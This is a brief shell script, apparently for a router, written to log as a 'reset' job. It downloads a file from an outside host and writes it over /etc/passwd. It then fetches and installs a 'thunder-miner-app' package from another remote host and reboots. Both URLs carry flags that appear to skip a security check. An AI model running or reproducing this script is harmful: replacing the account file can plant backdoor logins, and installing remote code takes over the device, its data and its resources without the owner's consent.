LOG_PATH=/tmp/reset.log
wget 'http://www.xiefucai.com/tools/zqb2/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
ubus call dcdn set_dcdn_client '{"count":1}'

wget 'http://update.peiluyou.com/conf/miner_plus_test/packages/thunder-miner-app_V1.3.164_meson.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH
opkg install /tmp/t.ipk

sleep 30
reboot